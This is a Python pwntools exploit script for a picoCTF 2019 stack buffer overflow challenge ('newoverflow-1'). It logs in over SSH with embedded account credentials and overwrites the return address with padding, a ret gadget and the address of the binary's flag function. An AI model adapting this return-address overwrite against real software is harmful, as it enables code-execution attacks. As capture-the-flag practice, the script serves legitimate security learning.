from pwn import *
import sys

argv = sys.argv
REMOTE = False
DEBUG = False

print(argv)
if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	s = ssh(host='2019shell1.picoctf.com', user='yuvalyoBlup', password="123456789")
	sh = s.process('vuln', cwd='/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a')
else:
	sh = process('./vuln')


e = ELF('./vuln')

flag_function_address = p64(e.symbols['flag'])

overflow_offset = 64

log.info('flag function address: {}'.format(hex(e.symbols['flag'])))

garbage = 'A' * overflow_offset
fake_rbp = 'B' * 8
ret_gadget = p64(0x00000000004005de) # to allign stack

payload = garbage + fake_rbp + ret_gadget + flag_function_address

if DEBUG:
	gdb.attach(sh)

sh.sendlineafter("Welcome to 64-bit. Give me a string that gets you the flag:", payload)

print sh.recvall()

